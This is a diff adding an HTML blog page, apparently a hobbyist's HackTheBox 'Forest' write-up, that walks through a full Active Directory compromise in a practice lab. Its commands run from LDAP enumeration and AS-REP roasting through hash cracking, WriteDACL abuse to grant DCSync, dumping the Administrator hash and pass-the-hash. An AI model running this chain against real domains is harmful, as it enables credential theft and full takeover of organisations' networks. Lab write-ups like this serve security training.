@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="HTB: Forest — Active Directory Walkthrough by th3_m4d_h4ck3r. Anonymous LDAP enum, AS-REP Roasting, WriteDACL abuse, DCSync, and Pass-the-Hash.">
+    <title>HTB: Forest — AD Walkthrough | th3_m4d_h4ck3r</title>
+    <link rel="icon" type="image/jpeg" href="cyber_avatar.jpg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0e27;
+            color: #e0e0e0;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* Animated grid background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.08;
+            background:
+                linear-gradient(90deg, transparent 98%, #00ff88 100%),
+                linear-gradient(0deg, transparent 98%, #00ff88 100%);
+            background-size: 50px 50px;
+            animation: grid-flow 20s linear infinite;
+        }
+
+        @keyframes grid-flow {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(50px); }
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Top nav */
+        .top-nav {
+            padding: 30px 20px 0;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .back-link {
+            color: #66d9ef;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+
+        .back-link:hover {
+            color: #00ff88;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        /* Writeup header */
+        .writeup-hero {
+            padding: 40px 20px 30px;
+            border-bottom: 1px solid #1a1f3a;
+            margin-bottom: 40px;
+        }
+
+        .writeup-title {
+            font-size: 2.6rem;
+            color: #00ff88;
+            text-shadow:
+                0 0 10px #00ff88,
+                0 0 20px rgba(0, 255, 136, 0.5);
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .writeup-badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .badge {
+            padding: 5px 14px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .badge-platform {
+            background: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            border: 1px solid rgba(0, 255, 136, 0.4);
+        }
+
+        .badge-easy {
+            background: rgba(102, 217, 239, 0.2);
+            color: #66d9ef;
+            border: 1px solid #66d9ef;
+        }
+
+        .badge-meta {
+            background: rgba(160, 160, 160, 0.1);
+            color: #a0a0a0;
+            border: 1px solid rgba(160, 160, 160, 0.3);
+        }
+
+        /* Content typography */
+        .content h2 {
+            font-size: 1.7rem;
+            color: #00ff88;
+            margin: 45px 0 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .content h2::before {
+            content: '> ';
+            color: #66d9ef;
+        }
+
+        .content h3 {
+            font-size: 1.25rem;
+            color: #66d9ef;
+            margin: 30px 0 15px;
+        }
+
+        .content p {
+            margin: 15px 0;
+            color: #d0d0d0;
+        }
+
+        .content ul, .content ol {
+            margin: 15px 0 15px 25px;
+            color: #d0d0d0;
+        }
+
+        .content li {
+            margin: 8px 0;
+        }
+
+        .content a {
+            color: #66d9ef;
+            text-decoration: none;
+            border-bottom: 1px solid rgba(102, 217, 239, 0.4);
+        }
+
+        .content a:hover {
+            color: #00ff88;
+            border-bottom-color: #00ff88;
+        }
+
+        .content strong {
+            color: #fff;
+        }
+
+        /* Inline code */
+        .content code {
+            background: #161b34;
+            color: #66d9ef;
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-size: 0.92em;
+            border: 1px solid #232a4d;
+        }
+
+        /* Code blocks */
+        .content pre {
+            background: #10152e;
+            border: 1px solid #232a4d;
+            border-left: 3px solid #00ff88;
+            border-radius: 6px;
+            padding: 18px 20px;
+            overflow-x: auto;
+            margin: 20px 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        .content pre code {
+            background: none;
+            border: none;
+            padding: 0;
+            color: #b8e6c8;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            white-space: pre;
+        }
+
+        /* Blockquote / notes */
+        .content blockquote {
+            background: rgba(102, 217, 239, 0.06);
+            border-left: 3px solid #66d9ef;
+            border-radius: 4px;
+            padding: 12px 20px;
+            margin: 20px 0;
+            color: #b0c4cc;
+        }
+
+        .content blockquote p {
+            color: #b0c4cc;
+        }
+
+        .content blockquote strong {
+            color: #66d9ef;
+        }
+
+        .content blockquote pre {
+            margin: 12px 0;
+        }
+
+        /* Tables */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+
+        .content table {
+            border-collapse: collapse;
+            width: 100%;
+            min-width: 480px;
+            font-size: 0.92rem;
+        }
+
+        .content th, .content td {
+            border: 1px solid #232a4d;
+            padding: 10px 14px;
+            text-align: left;
+        }
+
+        .content th {
+            background: #161b34;
+            color: #00ff88;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.85rem;
+        }
+
+        .content td {
+            color: #d0d0d0;
+        }
+
+        .content tr:nth-child(even) td {
+            background: rgba(22, 27, 52, 0.4);
+        }
+
+        /* Horizontal rule */
+        .content hr {
+            border: none;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            margin: 40px 0;
+        }
+
+        .content .em-note {
+            color: #888;
+            font-style: italic;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 50px 20px 40px;
+            border-top: 1px solid #1a1f3a;
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 50px;
+        }
+
+        .terminal-prompt {
+            color: #00ff88;
+            font-weight: bold;
+        }
+
+        footer a {
+            color: #66d9ef;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            color: #00ff88;
+        }
+
+        @media (max-width: 768px) {
+            .writeup-title {
+                font-size: 1.9rem;
+            }
+            .content h2 {
+                font-size: 1.4rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+
+    <nav class="top-nav">
+        <a href="index.html#writeups" class="back-link">&larr; Back to all writeups</a>
+    </nav>
+
+    <div class="container">
+        <div class="writeup-hero">
+            <h1 class="writeup-title">HTB: Forest — Active Directory Walkthrough</h1>
+            <div class="writeup-badges">
+                <span class="badge badge-platform">HackTheBox</span>
+                <span class="badge badge-easy">Easy</span>
+                <span class="badge badge-meta">Windows Server 2016</span>
+                <span class="badge badge-meta">Domain: htb.local</span>
+            </div>
+            <p class="em-note">Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations</p>
+        </div>
+
+        <div class="content">
+            <h2>Overview</h2>
+            <p>
+                Forest is a beginner-friendly Active Directory box that chains together several
+                classic AD misconfigurations into a full domain compromise:
+            </p>
+            <ol>
+                <li><strong>Anonymous LDAP bind</strong> to enumerate domain users</li>
+                <li><strong>AS-REP Roasting</strong> against an account with Kerberos pre-authentication disabled</li>
+                <li><strong>Nested group membership abuse</strong> (<code>Account Operators</code> &rarr; <code>Exchange Windows Permissions</code>)</li>
+                <li><strong>WriteDACL abuse</strong> to self-grant DCSync rights</li>
+                <li><strong>DCSync attack</strong> to dump domain credentials</li>
+                <li><strong>Pass-the-Hash</strong> as Administrator for full domain compromise</li>
+            </ol>
+
+            <hr>
+
+            <h2>Reconnaissance</h2>
+            <h3>Nmap</h3>
+            <p>
+                A full TCP port scan against the target reveals a textbook Domain Controller
+                fingerprint:
+            </p>
+            <pre><code>sudo nmap -p- -sC -sV --min-rate 5000 &lt;TARGET_IP&gt; -oN nmap_scan.txt</code></pre>
+            <p>Key ports:</p>
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>53</td><td>DNS</td><td>Simple DNS Plus</td></tr>
+                        <tr><td>88</td><td>Kerberos</td><td>Microsoft Windows Kerberos</td></tr>
+                        <tr><td>389/3268</td><td>LDAP</td><td><code>Domain: htb.local, Site: Default-First-Site-Name</code></td></tr>
+                        <tr><td>445</td><td>SMB</td><td>Windows Server 2016 Standard 14393</td></tr>
+                        <tr><td>5985</td><td>WinRM</td><td>Microsoft HTTPAPI httpd 2.0</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <p>
+                The nmap SMB scripts also revealed that anonymous (guest) authentication was
+                accepted:
+            </p>
+            <pre><code>smb-security-mode:
+  account_used: guest</code></pre>
+            <p><strong>Domain:</strong> <code>htb.local</code> &nbsp;&nbsp; <strong>Hostname:</strong> <code>FOREST</code></p>
+
+            <hr>
+
+            <h2>Anonymous LDAP Enumeration</h2>
+            <p>
+                Forest's LDAP service accepts unauthenticated binds, allowing full directory
+                enumeration without credentials:
+            </p>
+            <pre><code>ldapsearch -x -H ldap://&lt;TARGET_IP&gt; -b "dc=htb,dc=local"</code></pre>
+            <p>
+                This returns a large amount of directory information, including a list of
+                domain users. Pulling just the usernames:
+            </p>
+            <pre><code>ldapsearch -x -H ldap://&lt;TARGET_IP&gt; -b "dc=htb,dc=local" \
+  "(objectClass=user)" sAMAccountName -LLL | grep "sAMAccountName:" | awk '{print $2}'</code></pre>
+            <blockquote>
+                <p>
+                    <strong>Note:</strong> Anonymous LDAP binds can silently truncate or omit some accounts
+                    (server-side result limits, indexing quirks, etc.). If you have a suspected
+                    username from a hint or prior knowledge, always confirm it with a direct,
+                    targeted query rather than trusting a broad dump:
+                </p>
+                <pre><code>ldapsearch -x -H ldap://&lt;TARGET_IP&gt; -b "dc=htb,dc=local" "(sAMAccountName=svc-alfresco)" sAMAccountName</code></pre>
+            </blockquote>
+
+            <hr>
+
+            <h2>AS-REP Roasting</h2>
+            <p>
+                With a user list in hand, check for accounts that have <strong>Kerberos
+                Pre-Authentication disabled</strong> (<code>UF_DONT_REQUIRE_PREAUTH</code>). Any such account
+                will hand back an AS-REP hash to an unauthenticated request — no password
+                needed to trigger it.
+            </p>
+            <pre><code>python3 GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip &lt;TARGET_IP&gt;</code></pre>
+            <p>
+                The account <strong><code>svc-alfresco</code></strong> comes back vulnerable, yielding a crackable
+                <code>$krb5asrep$23$</code> hash.
+            </p>
+            <h3>Cracking the Hash</h3>
+            <pre><code>hashcat -m 18200 svc_alfresco.hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+            <p>Cracked in under a second on an RTX 5070:</p>
+            <pre><code>svc-alfresco : s3rvice</code></pre>
+
+            <hr>
+
+            <h2>Initial Foothold</h2>
+            <p>Credentials confirmed valid over SMB:</p>
+            <pre><code>crackmapexec smb &lt;TARGET_IP&gt; -u svc-alfresco -p 's3rvice'</code></pre>
+            <p>Since WinRM (5985) is open, this gets us a full interactive shell:</p>
+            <pre><code>evil-winrm -i &lt;TARGET_IP&gt; -u svc-alfresco -p 's3rvice'</code></pre>
+            <p><strong>User flag</strong> captured from <code>C:\Users\svc-alfresco\Desktop\user.txt</code>. ✅</p>
+
+            <hr>
+
+            <h2>Privilege Escalation Path</h2>
+            <h3>1. Mapping the ACLs</h3>
+            <p>
+                Querying the domain object's ACL directly (<code>dsacls</code>) or via BloodHound reveals
+                that the group <strong><code>Exchange Windows Permissions</code></strong> holds <code>WriteDACL</code> rights
+                over the domain object <code>DC=htb,DC=local</code>:
+            </p>
+            <pre><code>dsacls "DC=htb,DC=local"</code></pre>
+            <pre><code>Allow HTB\Exchange Windows Permissions
+                          SPECIAL ACCESS
+                          WRITE PERMISSIONS
+                          DELETE TREE</code></pre>
+            <p>
+                This is a common Exchange installation artifact — Exchange grants this group
+                broad domain permissions to support mail flow management, and it's frequently
+                over-privileged relative to what it actually needs.
+            </p>
+
+            <h3>2. The Group Nesting Chain</h3>
+            <p>
+                <code>svc-alfresco</code> isn't a direct member of <code>Exchange Windows Permissions</code>, but
+                group nesting gets it there:
+            </p>
+            <pre><code>svc-alfresco → Service Accounts → Privileged IT Accounts → Account Operators</code></pre>
+            <p>
+                <strong><code>Account Operators</code></strong> has rights to manage group memberships — including
+                adding <code>svc-alfresco</code> directly into <code>Exchange Windows Permissions</code>.
+            </p>
+
+            <h3>3. Adding svc-alfresco to Exchange Windows Permissions</h3>
+            <blockquote>
+                <p>
+                    <strong>Lesson learned:</strong> Windows-side commands (<code>net group ... /add</code>,
+                    <code>Add-ADGroupMember</code>) reported success in this environment but the
+                    membership <strong>did not actually persist</strong> — confirmed via
+                    <code>Get-ADPrincipalGroupMembership svc-alfresco</code>, which is the authoritative
+                    check (don't just trust <code>Get-ADGroupMember</code> on the group side).
+                </p>
+                <p>
+                    The fix: perform the group add from <strong>Linux via Samba's <code>net rpc</code></strong>
+                    instead, which worked reliably where the Windows-native tools silently
+                    failed:
+                </p>
+            </blockquote>
+            <pre><code>net rpc group addmem "Exchange Windows Permissions" svc-alfresco \
+  -U htb.local/svc-alfresco%s3rvice -S &lt;TARGET_IP&gt;</code></pre>
+            <p>Verify:</p>
+            <pre><code>net rpc group members "Exchange Windows Permissions" -U svc-alfresco%s3rvice -S &lt;TARGET_IP&gt;</code></pre>
+
+            <h3>4. Granting DCSync Rights via WriteDACL Abuse</h3>
+            <p>
+                With <code>svc-alfresco</code> now inheriting <code>Exchange Windows Permissions</code>' WriteDACL
+                right, we can write a new ACE onto the domain object granting DCSync
+                (<code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code>):
+            </p>
+            <pre><code>dacledit.py -action write -rights DCSync -principal svc-alfresco \
+  -target-dn "DC=htb,DC=local" htb.local/svc-alfresco:'s3rvice' -dc-ip &lt;TARGET_IP&gt;</code></pre>
+            <pre><code>[*] DACL backed up to dacledit-&lt;timestamp&gt;.bak
+[*] DACL modified successfully!</code></pre>
+
+            <h3>5. DCSync — Dumping Domain Credentials</h3>
+            <pre><code>impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@&lt;TARGET_IP&gt; -just-dc-user Administrator</code></pre>
+            <pre><code>htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;NTLM_HASH&gt;:::</code></pre>
+
+            <h3>6. Pass-the-Hash to Administrator</h3>
+            <pre><code>evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+            <p><strong>Root flag</strong> captured from <code>C:\Users\Administrator\Desktop\root.txt</code>. ✅</p>
+
+            <hr>
+
+            <h2>Attack Chain Summary</h2>
+            <pre><code>Anonymous LDAP enum
+        │
+        ▼
+AS-REP Roast (svc-alfresco)  →  hashcat crack  →  s3rvice
+        │
+        ▼
+WinRM foothold as svc-alfresco  →  USER FLAG
+        │
+        ▼
+Account Operators (nested membership)
+        │
+        ▼
+Add svc-alfresco → Exchange Windows Permissions  (via net rpc, NOT native AD cmdlets)
+        │
+        ▼
+WriteDACL abuse → grant DCSync rights to svc-alfresco
+        │
+        ▼
+DCSync → dump Administrator NTLM hash
+        │
+        ▼
+Pass-the-Hash as Administrator  →  ROOT FLAG</code></pre>
+
+            <hr>
+
+            <h2>Key Takeaways</h2>
+            <ul>
+                <li><strong>Anonymous LDAP is a goldmine</strong> — always check it first on any AD box.</li>
+                <li><strong>AS-REP Roasting requires no credentials at all</strong> — just a valid username list.</li>
+                <li><strong>Group nesting matters</strong> — direct group membership isn't the whole picture;
+                    always trace inherited rights through nested groups.</li>
+                <li><strong>Exchange installs frequently over-privilege AD groups</strong> — <code>Exchange
+                    Windows Permissions</code> and <code>Exchange Trusted Subsystem</code> are common
+                    privilege-escalation vectors on any domain running on-prem Exchange.</li>
+                <li><strong>Verify group membership changes from the authoritative side.</strong>
+                    <code>Get-ADPrincipalGroupMembership &lt;user&gt;</code> is the ground truth — don't trust a
+                    command's "success" message or a possibly-stale group-side listing.</li>
+                <li><strong>Samba's <code>net rpc</code> is a solid fallback</strong> for AD object modification when
+                    native Windows tooling behaves inconsistently.</li>
+            </ul>
+
+            <hr>
+
+            <p class="em-note">
+                Written up as part of ongoing CPTS/OSCP prep — HTB Academy Penetration
+                Tester path, Active Directory module practice.
+            </p>
+        </div>
+    </div>
+
+    <footer>
+        <p><span class="terminal-prompt">&gt;</span> Built with code, coffee, and chaos.</p>
+        <p style="margin-top: 10px;">
+            <a href="index.html#writeups">&larr; Back to all writeups</a>
+        </p>
+        <p style="margin-top: 10px;">© 2025 th3_m4d_h4ck3r | All vulnerabilities responsibly disclosed.</p>
+    </footer>
+</body>
+</html>
